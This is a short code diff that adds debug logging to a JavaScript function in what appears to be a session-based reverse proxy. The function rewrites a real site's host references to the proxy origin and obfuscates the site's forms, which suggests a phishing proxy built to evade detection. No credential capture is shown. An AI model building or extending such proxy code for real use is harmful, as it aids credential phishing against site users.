@@ -1267,6 +1267,14 @@ function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
     let html = htmlBuffer.toString('utf8');
     console.log('[DEBUG] HTML preview:', html.substring(0, 500));
 
+    // Find the form tag and log it for debugging
+const formTagMatch = html.match(/<form[^>]*>/i);
+if (formTagMatch) {
+    console.log('[DEBUG] Found form tag:', formTagMatch[0]);
+} else {
+    console.log('[DEBUG] No <form> tag found in HTML');
+}
+
     // Replace all absolute references to the real host
     const hostRegex = new RegExp(`https?:\\/\\/${realHost.replace(/\./g, '\\.')}`, 'g');
     html = html.replace(hostRegex, proxyOrigin);
@@ -1293,6 +1301,7 @@ function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
         } else { // name
             regex = new RegExp(`<(div|form)[^>]*\\s+name\\s*=\\s*["']?${sel.value}["']?[^>]*>([\\s\\S]*?)<\\/\\1>`, 'i');
         }
+        console.log('[DEBUG] Trying regex:', regex.toString());
         const match = html.match(regex);
         if (match) {
             console.log(`[FORM OBFUSCATION] ✅ Found and obfuscated form with ${sel.type}: "${sel.value}"`);
@@ -1320,7 +1329,7 @@ function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
             break;
         }
     }
-
+   console.log('[DEBUG] Loop finished, obfuscatedHtml =', obfuscatedHtml);
     // Fallback: if no match, try to obfuscate any <form>
     if (!obfuscatedHtml) {
         const formRegex = /<form[^>]*>([\s\S]*?)<\/form>/i;
